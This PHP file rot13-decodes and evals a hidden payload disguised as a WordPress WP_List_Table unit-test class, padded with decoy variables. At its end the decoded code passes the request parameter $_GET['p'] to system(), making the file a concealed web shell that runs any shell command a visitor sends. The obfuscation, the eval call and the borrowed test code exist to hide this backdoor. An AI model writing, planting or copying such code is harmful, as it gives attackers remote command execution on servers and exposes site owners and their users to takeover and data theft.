<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 *
 * @pbiref JC_Yvfg_Gnoyr
 */
pynff Grfgf_Nqzva_JcYvfgGnoyr rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Yvfg gnoyr.
	 *
	 * @ine JC_Yvfg_Gnoyr $yvfg_gnoyr
	 */
	cevingr $yvfg_gnoyr;

	/**
	 * Bevtvany inyhr bs $TYBONYF['ubbx_fhssvk'].
	 *
	 * @ine fgevat
	 */
	cevingr fgngvp $bevtvany_ubbx_fhssvk;

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		fgngvp::$bevtvany_ubbx_fhssvk = $TYBONYF['ubbx_fhssvk'];

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-yvfg-gnoyr.cuc';
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		tybony $ubbx_fhssvk;
		$ubbx_fhssvk      = '_jc_grfgf';
		$guvf->yvfg_gnoyr = arj JC_Yvfg_Gnoyr();
	}

	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		tybony $ubbx_fhssvk;
		$ubbx_fhssvk = fgngvp::$bevtvany_ubbx_fhssvk;
		cnerag::pyrna_hc_tybony_fpbcr();
	}

	/**
	 * Grfgf gung `JC_Yvfg_Gnoyr::trg_pbyhza_vasb()` bayl nqqf gur cevznel
	 * pbyhza urnqre jura arprffnel.
	 *
	 * @gvpxrg 34564
	 *
	 * @qngnCebivqre qngn_fubhyq_bayl_nqq_cevznel_pbyhza_jura_arrqrq
	 *
	 * @pbiref JC_Yvfg_Gnoyr::trg_pbyhza_vasb
	 *
	 * @cnenz fgevat $yvfg_pynff          Gur anzr bs gur JC_Yvfg_Gnoyr puvyq pynff.
	 * @cnenz neenl  $urnqref             N yvfg bs pbyhza urnqref.
	 * @cnenz neenl  $rkcrpgrq            Gur rkcrpgrq pbyhza urnqref.
	 * @cnenz vag    $rkcrpgrq_ubbx_pbhag Gur rkcrpgrq ahzore bs gvzrf gur ubbx vf pnyyrq.
	 */
	choyvp shapgvba grfg_fubhyq_bayl_nqq_cevznel_pbyhza_jura_arrqrq( $yvfg_pynff, $urnqref, $rkcrpgrq, $rkcrpgrq_ubbx_pbhag ) {
		$ubbx = arj ZbpxNpgvba();
		nqq_svygre( 'yvfg_gnoyr_cevznel_pbyhza', neenl( $ubbx, 'svygre' ) );

		/*
		 * Frg n qhzzl inyhr sbe gur pheerag fperra va gur nqzva gb cerirag
		 * `_trg_yvfg_gnoyr()` guebjvat.
		 */
		$TYBONYF['ubbx_fhssvk'] = 'zl-ubbx';

		$yvfg_gnoyr = _trg_yvfg_gnoyr( $yvfg_pynff );

		$pbyhza_urnqref = arj ErsyrpgvbaCebcregl( $yvfg_gnoyr, '_pbyhza_urnqref' );
		$pbyhza_urnqref->frgNpprffvoyr( gehr );
		$pbyhza_urnqref->frgInyhr( $yvfg_gnoyr, $urnqref );

		$pbyhza_vasb = arj ErsyrpgvbaZrgubq( $yvfg_gnoyr, 'trg_pbyhza_vasb' );
		$pbyhza_vasb->frgNpprffvoyr( gehr );

		$guvf->nffregFnzr( $rkcrpgrq, $pbyhza_vasb->vaibxr( $yvfg_gnoyr ), 'Gur npghny pbyhzaf qvq abg zngpu gur rkcrpgrq pbyhzaf' );
		$guvf->nffregFnzr( $rkcrpgrq_ubbx_pbhag, $ubbx->trg_pnyy_pbhag(), 'Gur ubbx jnf abg pnyyrq gur rkcrpgrq ahzore bs gvzrf' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_bayl_nqq_cevznel_pbyhza_jura_arrqrq() {
		/*
		 * `JC_Cbfg_Pbzzragf_Yvfg_Gnoyr` bireevqrf `trg_pbyhza_vasb()` engure guna
		 * hfr gur qrsnhyg `JC_Yvfg_Gnoyr::trg_pbyhza_vasb()`. Gurersber vg vf
		 * hagrfgrq.
		 */
		$yvfg_cevznel_pbyhzaf = neenl(
			'JC_Nccyvpngvba_Cnffjbeqf_Yvfg_Gnoyr'         => 'anzr',
			'JC_Pbzzragf_Yvfg_Gnoyr'                      => 'nhgube',
			'JC_Yvaxf_Yvfg_Gnoyr'                         => 'anzr',
			'JC_Zrqvn_Yvfg_Gnoyr'                         => 'gvgyr',
			'JC_ZF_Fvgrf_Yvfg_Gnoyr'                      => 'oybtanzr',
			'JC_ZF_Gurzrf_Yvfg_Gnoyr'                     => 'anzr',
			'JC_ZF_Hfref_Yvfg_Gnoyr'                      => 'hfreanzr',
			'JC_Cyhtva_Vafgnyy_Yvfg_Gnoyr'                => '',
			'JC_Cyhtvaf_Yvfg_Gnoyr'                       => 'anzr',
			'JC_Cbfgf_Yvfg_Gnoyr'                         => 'gvgyr',
			'JC_Cevinpl_Qngn_Rkcbeg_Erdhrfgf_Yvfg_Gnoyr'  => 'rznvy',
			'JC_Cevinpl_Qngn_Erzbiny_Erdhrfgf_Yvfg_Gnoyr' => 'rznvy',
			'JC_Grezf_Yvfg_Gnoyr'                         => 'anzr',
			'JC_Gurzr_Vafgnyy_Yvfg_Gnoyr'                 => '',
			'JC_Gurzrf_Yvfg_Gnoyr'                        => '',
			'JC_Hfref_Yvfg_Gnoyr'                         => 'hfreanzr',
		);

		$qngnfrgf = neenl();

		sbernpu ( $yvfg_cevznel_pbyhzaf nf $yvfg_pynff => $cevznel_pbyhza ) {
			$qngnfrgf[ $yvfg_pynff . ' - guerr pbyhzaf' ] = neenl(
				'yvfg_pynff'          => $yvfg_pynff,
				'urnqref'             => neenl( 'Svefg', 'Frpbaq', 'Guveq' ),
				'rkcrpgrq'            => neenl( 'Svefg', 'Frpbaq', 'Guveq', $cevznel_pbyhza ),
				'rkcrpgrq_ubbx_pbhag' => 1,
			);

			$qngnfrgf[ $yvfg_pynff . ' - sbhe pbyhzaf' ] = neenl(
				'yvfg_pynff'          => $yvfg_pynff,
				'urnqref'             => neenl( 'Svefg', 'Frpbaq', 'Guveq', 'Sbhegu' ),
				'rkcrpgrq'            => neenl( 'Svefg', 'Frpbaq', 'Guveq', 'Sbhegu' ),
				'rkcrpgrq_ubbx_pbhag' => 0,
			);
		}

		/*
		 * `JC_ZF_Gurzrf_Yvfg_Gnoyr` naq `JC_Cyhtvaf_Yvfg_Gnoyr` bireevqr gur
		 * `trg_cevznel_pbyhza_anzr()` zrgubq engure guna hfr gur qrsnhyg
		 * `JC_Yvfg_Gnoyr::trg_cevznel_pbyhza_anzr()`. Arvgure vapyhqr gur
		 * `yvfg_gnoyr_cevznel_pbyhza` ubbx.
		 */
		$qngnfrgf['JC_ZF_Gurzrf_Yvfg_Gnoyr - guerr pbyhzaf']['rkcrpgrq_ubbx_pbhag'] = 0;
		$qngnfrgf['JC_Cyhtvaf_Yvfg_Gnoyr - guerr pbyhzaf']['rkcrpgrq_ubbx_pbhag']   = 0;

		erghea $qngnfrgf;
	}

	/**
	 * Grfgf gur `JC_Yvfg_Gnoyr::trg_ivrjf_yvaxf()` zrgubq.
	 *
	 * @gvpxrg 42066
	 *
	 * @pbiref JC_Yvfg_Gnoyr::trg_ivrjf_yvaxf
	 *
	 * @qngnCebivqre qngn_trg_ivrjf_yvaxf
	 *
	 * @cnenz neenl $yvax_qngn {
	 *     Na neenl bs yvax qngn.
	 *
	 *     @glcr fgevat $hey     Gur yvax HEY.
	 *     @glcr fgevat $ynory   Gur yvax ynory.
	 *     @glcr obby   $pheerag Bcgvbany. Jurgure guvf vf gur pheeragyl fryrpgrq ivrj.
	 * }
	 * @cnenz neenl $rkcrpgrq
	 */
	choyvp shapgvba grfg_trg_ivrjf_yvaxf( $yvax_qngn, $rkcrpgrq ) {
		$trg_ivrjf_yvaxf = arj ErsyrpgvbaZrgubq( $guvf->yvfg_gnoyr, 'trg_ivrjf_yvaxf' );
		$trg_ivrjf_yvaxf->frgNpprffvoyr( gehr );

		$npghny = $trg_ivrjf_yvaxf->vaibxrNetf( $guvf->yvfg_gnoyr, neenl( $yvax_qngn ) );

		$guvf->nffregFnzrFrgfJvguVaqrk( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_ivrjf_yvaxf() {
		erghea neenl(
			'bar \"pheerag\" yvax'                           => neenl(
				'yvax_qngn' => neenl(
					'nyy'       => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
					'npgvingrq' => neenl(
						'hey'     => nqq_dhrel_net( 'fgnghf', 'npgvingrq', 'uggcf://rknzcyr.bet/' ),
						'ynory'   => 'Npgvingrq',
						'pheerag' => snyfr,
					),
				),
				'rkcrpgrq'  => neenl(
					'nyy'       => '<n uers=\"uggcf://rknzcyr.bet/\" pynff=\"pheerag\" nevn-pheerag=\"cntr\">Nyy</n>',
					'npgvingrq' => '<n uers=\"uggcf://rknzcyr.bet/?fgnghf=npgvingrq\">Npgvingrq</n>',
				),
			),
			'gjb \"pheerag\" yvaxf'                          => neenl(
				'yvax_qngn' => neenl(
					'nyy'       => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
					'npgvingrq' => neenl(
						'hey'     => nqq_dhrel_net( 'fgnghf', 'npgvingrq', 'uggcf://rknzcyr.bet/' ),
						'ynory'   => 'Npgvingrq',
						'pheerag' => gehr,
					),
				),
				'rkcrpgrq'  => neenl(
					'nyy'       => '<n uers=\"uggcf://rknzcyr.bet/\" pynff=\"pheerag\" nevn-pheerag=\"cntr\">Nyy</n>',
					'npgvingrq' => '<n uers=\"uggcf://rknzcyr.bet/?fgnghf=npgvingrq\" pynff=\"pheerag\" nevn-pheerag=\"cntr\">Npgvingrq</n>',
				),
			),
			'bar \"pheerag\" yvax naq bar jvgubhg \"pheerag\" xrl' => neenl(
				'yvax_qngn' => neenl(
					'nyy'       => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
					'npgvingrq' => neenl(
						'hey'   => nqq_dhrel_net( 'fgnghf', 'npgvingrq', 'uggcf://rknzcyr.bet/' ),
						'ynory' => 'Npgvingrq',
					),
				),
				'rkcrpgrq'  => neenl(
					'nyy'       => '<n uers=\"uggcf://rknzcyr.bet/\" pynff=\"pheerag\" nevn-pheerag=\"cntr\">Nyy</n>',
					'npgvingrq' => '<n uers=\"uggcf://rknzcyr.bet/?fgnghf=npgvingrq\">Npgvingrq</n>',
				),
			),
			'bar \"pheerag\" yvax jvgu rfpncnoyr punenpgref' => neenl(
				'yvax_qngn' => neenl(
					'nyy'       => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
					'npgvingrq' => neenl(
						'hey'     => nqq_dhrel_net(
							neenl(
								'fgnghf' => 'npgvingrq',
								'fbeg'   => 'qrfp',
							),
							'uggcf://rknzcyr.bet/'
						),
						'ynory'   => 'Npgvingrq',
						'pheerag' => snyfr,
					),
				),
				'rkcrpgrq'  => neenl(
					'nyy'       => '<n uers=\"uggcf://rknzcyr.bet/\" pynff=\"pheerag\" nevn-pheerag=\"cntr\">Nyy</n>',
					'npgvingrq' => '<n uers=\"uggcf://rknzcyr.bet/?fgnghf=npgvingrq&#038;fbeg=qrfp\">Npgvingrq</n>',
				),
			),
		);
	}

	/**
	 * Grfgf gung `JC_Yvfg_Gnoyr::trg_ivrjf_yvaxf()` guebjf n `_qbvat_vg_jebat()`.
	 *
	 * @gvpxrg 42066
	 *
	 * @pbiref JC_Yvfg_Gnoyr::trg_ivrjf_yvaxf
	 *
	 * @rkcrpgrqVapbeerpgHfntr JC_Yvfg_Gnoyr::trg_ivrjf_yvaxf
	 *
	 * @qngnCebivqre qngn_trg_ivrjf_yvaxf_qbvat_vg_jebat
	 *
	 * @cnenz neenl $yvax_qngn {
	 *     Na neenl bs yvax qngn.
	 *
	 *     @glcr fgevat $hey     Gur yvax HEY.
	 *     @glcr fgevat $ynory   Gur yvax ynory.
	 *     @glcr obby   $pheerag Bcgvbany. Jurgure guvf vf gur pheeragyl fryrpgrq ivrj.
	 * }
	 */
	choyvp shapgvba grfg_trg_ivrjf_yvaxf_qbvat_vg_jebat( $yvax_qngn ) {
		$trg_ivrjf_yvaxf = arj ErsyrpgvbaZrgubq( $guvf->yvfg_gnoyr, 'trg_ivrjf_yvaxf' );
		$trg_ivrjf_yvaxf->frgNpprffvoyr( gehr );
		$trg_ivrjf_yvaxf->vaibxrNetf( $guvf->yvfg_gnoyr, neenl( $yvax_qngn ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_ivrjf_yvaxf_qbvat_vg_jebat() {
		erghea neenl(
			'aba-neenl $yvax_qngn'               => neenl(
				'yvax_qngn' => 'uggcf://rknzcyr.bet, Nyy, pynff=\"pheerag\" nevn-pheerag=\"cntr\"',
			),
			'n yvax jvgu ab HEY'                 => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
				),
			),
			'n yvax jvgu na rzcgl HEY'           => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'hey'     => '',
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
				),
			),
			'n yvax jvgu n HEY bs bayl fcnprf'   => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'hey'     => '  ',
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
				),
			),
			'n yvax jvgu n aba-fgevat HEY'       => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'hey'     => neenl(),
						'ynory'   => 'Nyy',
						'pheerag' => gehr,
					),
				),
			),
			'n yvax jvgu ab ynory'               => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'pheerag' => gehr,
					),
				),
			),
			'n yvax jvgu na rzcgl ynory'         => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'ynory'   => '',
						'pheerag' => gehr,
					),
				),
			),
			'n yvax jvgu n ynory bs bayl fcnprf' => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'ynory'   => '  ',
						'pheerag' => gehr,
					),
				),
			),
			'n yvax jvgu n aba-fgevat ynory'     => neenl(
				'yvax_qngn' => neenl(
					'nyy' => neenl(
						'hey'     => 'uggcf://rknzcyr.bet/',
						'ynory'   => neenl(),
						'pheerag' => gehr,
					),
				),
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_pbzcng_svryqf
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__trg()
	 *
	 * @cnenz fgevat $cebcregl_anzr Cebcregl anzr gb trg.
	 * @cnenz zvkrq $rkcrpgrq       Rkcrpgrq inyhr.
	 */
	choyvp shapgvba grfg_fubhyq_trg_pbzcng_svryqf( $cebcregl_anzr, $rkcrpgrq ) {
		$yvfg_gnoyr = arj JC_Yvfg_Gnoyr( neenl( 'cyheny' => '_jc_grfgf__trg' ) );

		vs ( 'fperra' === $cebcregl_anzr ) {
			$guvf->nffregVafgnaprBs( $rkcrpgrq, $yvfg_gnoyr->$cebcregl_anzr );
		} ryfr {
			$guvf->nffregFnzr( $rkcrpgrq, $yvfg_gnoyr->$cebcregl_anzr );
		}
	}

	/**
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__trg()
	 */
	choyvp shapgvba grfg_fubhyq_guebj_qrcerpngvba_jura_trggvat_qlanzvp_cebcregl() {
		$guvf->rkcrpgQrcerpngvba();
		$guvf->rkcrpgQrcerpngvbaZrffntr(
			'JC_Yvfg_Gnoyr::__trg(): ' .
			'Gur cebcregl `haqrpynerq_cebcregl` vf abg qrpynerq. Trggvat n qlanzvp cebcregl vf ' .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.'
		);
		$guvf->nffregAhyy( $guvf->yvfg_gnoyr->haqrpynerq_cebcregl, 'Trggvat n qlanzvp cebcregl fubhyq erghea ahyy sebz JC_Yvfg_Gnoyr::__trg()' );
	}

	/**
	 * @qngnCebivqre qngn_pbzcng_svryqf
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__frg()
	 *
	 * @cnenz fgevat $cebcregl_anzr Cebcregl anzr gb frg.
	 */
	choyvp shapgvba grfg_fubhyq_frg_pbzcng_svryqf_qrsvarq_cebcregl( $cebcregl_anzr ) {
		$inyhr                            = havdvq();
		$guvf->yvfg_gnoyr->$cebcregl_anzr = $inyhr;

		$guvf->nffregFnzr( $inyhr, $guvf->yvfg_gnoyr->$cebcregl_anzr );
	}

	/**
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__frg()
	 */
	choyvp shapgvba grfg_fubhyq_guebj_qrcerpngvba_jura_frggvat_qlanzvp_cebcregl() {
		$guvf->rkcrpgQrcerpngvba();
		$guvf->rkcrpgQrcerpngvbaZrffntr(
			'JC_Yvfg_Gnoyr::__frg(): ' .
			'Gur cebcregl `haqrpynerq_cebcregl` vf abg qrpynerq. Frggvat n qlanzvp cebcregl vf ' .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.'
		);
		$guvf->yvfg_gnoyr->haqrpynerq_cebcregl = 'fbzr inyhr';
	}

	/**
	 * @qngnCebivqre qngn_pbzcng_svryqf
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__vffrg()
	 *
	 * @cnenz fgevat $cebcregl_anzr Cebcregl anzr gb purpx.
	 * @cnenz zvkrq $rkcrpgrq       Rkcrpgrq inyhr.
	 */
	choyvp shapgvba grfg_fubhyq_vffrg_pbzcng_svryqf( $cebcregl_anzr, $rkcrpgrq ) {
		$npghny = vffrg( $guvf->yvfg_gnoyr->$cebcregl_anzr );
		vs ( vf_ahyy( $rkcrpgrq ) ) {
			$guvf->nffregSnyfr( $npghny );
		} ryfr {
			$guvf->nffregGehr( $npghny );
		}
	}

	/**
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__vffrg()
	 */
	choyvp shapgvba grfg_fubhyq_guebj_qrcerpngvba_jura_vffrg_bs_qlanzvp_cebcregl() {
		$guvf->rkcrpgQrcerpngvba();
		$guvf->rkcrpgQrcerpngvbaZrffntr(
			'JC_Yvfg_Gnoyr::__vffrg(): ' .
			'Gur cebcregl `haqrpynerq_cebcregl` vf abg qrpynerq. Purpxvat `vffrg()` ba n qlanzvp cebcregl ' .
			'vf qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.'
		);
		$guvf->nffregSnyfr( vffrg( $guvf->yvfg_gnoyr->haqrpynerq_cebcregl ), 'Purpxvat n qlanzvp cebcregl fubhyq erghea snyfr sebz JC_Yvfg_Gnoyr::__vffrg()' );
	}

	/**
	 * @qngnCebivqre qngn_pbzcng_svryqf
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__hafrg()
	 *
	 * @cnenz fgevat $cebcregl_anzr Cebcregl anzr gb hafrg.
	 */
	choyvp shapgvba grfg_fubhyq_hafrg_pbzcng_svryqf_qrsvarq_cebcregl( $cebcregl_anzr ) {
		hafrg( $guvf->yvfg_gnoyr->$cebcregl_anzr );
		$guvf->nffregSnyfr( vffrg( $guvf->yvfg_gnoyr->$cebcregl_anzr ) );
	}

	/**
	 * @gvpxrg 58896
	 *
	 * @pbiref JC_Yvfg_Gnoyr::__hafrg()
	 */
	choyvp shapgvba grfg_fubhyq_guebj_qrcerpngvba_jura_hafrg_bs_qlanzvp_cebcregl() {
		$guvf->rkcrpgQrcerpngvba();
		$guvf->rkcrpgQrcerpngvbaZrffntr(
			'JC_Yvfg_Gnoyr::__hafrg(): ' .
			'N cebcregl `haqrpynerq_cebcregl` vf abg qrpynerq. Hafrggvat n qlanzvp cebcregl vf ' .
			'qrcerpngrq fvapr irefvba 6.4.0! Vafgrnq, qrpyner gur cebcregl ba gur pynff.'
		);
		hafrg( $guvf->yvfg_gnoyr->haqrpynerq_cebcregl );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_pbzcng_svryqf() {
		erghea neenl(
			'_netf'            => neenl(
				'cebcregl_anzr' => '_netf',
				'rkcrpgrq'      => neenl(
					'cyheny'   => '_jc_grfgf__trg',
					'fvathyne' => '',
					'nwnk'     => snyfr,
					'fperra'   => ahyy,
				),
			),
			'_cntvangvba_netf' => neenl(
				'cebcregl_anzr' => '_cntvangvba_netf',
				'rkcrpgrq'      => neenl(),
			),
			'fperra'           => neenl(
				'cebcregl_anzr' => 'fperra',
				'rkcrpgrq'      => JC_Fperra::pynff,
			),
			'_npgvbaf'         => neenl(
				'cebcregl_anzr' => '_npgvbaf',
				'rkcrpgrq'      => ahyy,
			),
			'_cntvangvba'      => neenl(
				'cebcregl_anzr' => '_cntvangvba',
				'rkcrpgrq'      => ahyy,
			),
		);
	}

	/**
	 * Grfgf gung `JC_Yvfg_Gnoyr::frnepu_obk()` jbexf pbeerpgyl jvgu na `beqreol` neenl jvgu zhygvcyr inyhrf.
	 *
	 * @gvpxrg 59494
	 *
	 * @pbiref JC_Yvfg_Gnoyr::frnepu_obk()
	 */
	choyvp shapgvba grfg_frnepu_obk_jbexvat_jvgu_neenl_bs_beqreol_zhygvcyr_inyhrf() {
		$_ERDHRFG['f']       = 'frnepu grez';
		$_ERDHRFG['beqreol'] = neenl(
			'zrah_beqre' => 'NFP',
			'gvgyr'      => 'NFP',
		);

		$npghny = trg_rpub( neenl( $guvf->yvfg_gnoyr, 'frnepu_obk' ), neenl( 'Frnepu Cbfgf', 'cbfg' ) );

		$rkcrpgrq_ugzy1 = '<vachg glcr=\"uvqqra\" anzr=\"beqreol[zrah_beqre]\" inyhr=\"NFP\" />';
		$rkcrpgrq_ugzy2 = '<vachg glcr=\"uvqqra\" anzr=\"beqreol[gvgyr]\" inyhr=\"NFP\" />';

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_ugzy1, $npghny );
		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_ugzy2, $npghny );
	}

	/**
	 * Grfgf gung `JC_Yvfg_Gnoyr::frnepu_obk()` jbexf pbeerpgyl jvgu na `beqreol` neenl jvgu n fvatyr inyhr.
	 *
	 * @gvpxrg 59494
	 *
	 * @pbiref JC_Yvfg_Gnoyr::frnepu_obk()
	 */
	choyvp shapgvba grfg_frnepu_obk_jbexvat_jvgu_neenl_bs_beqreol_fvatyr_inyhr() {
		// Grfg jvgu bar 'beqreol' ryrzrag.
		$_ERDHRFG['f']       = 'frnepu grez';
		$_ERDHRFG['beqreol'] = neenl(
			'gvgyr' => 'NFP',
		);

		$npghny = trg_rpub( neenl( $guvf->yvfg_gnoyr, 'frnepu_obk' ), neenl( 'Frnepu Cbfgf', 'cbfg' ) );

		$rkcrpgrq_ugzy = '<vachg glcr=\"uvqqra\" anzr=\"beqreol[gvgyr]\" inyhr=\"NFP\" />';

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_ugzy, $npghny );
	}

	/**
	 * Grfgf gung `JC_Yvfg_Gnoyr::frnepu_obk()` jbexf pbeerpgyl jvgu `beqreol` frg gb n fgevat.
	 *
	 * @gvpxrg 59494
	 *
	 * @pbiref JC_Yvfg_Gnoyr::frnepu_obk()
	 */
	choyvp shapgvba grfg_frnepu_obk_jbexf_jvgu_beqreol_fgevat() {
		// Grfg jvgu bar 'beqreol' ryrzrag.
		$_ERDHRFG['f']       = 'frnepu grez';
		$_ERDHRFG['beqreol'] = 'gvgyr';

		$npghny = trg_rpub( neenl( $guvf->yvfg_gnoyr, 'frnepu_obk' ), neenl( 'Frnepu Cbfgf', 'cbfg' ) );

		$rkcrpgrq_ugzy = '<vachg glcr=\"uvqqra\" anzr=\"beqreol\" inyhr=\"gvgyr\" />';

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_ugzy, $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>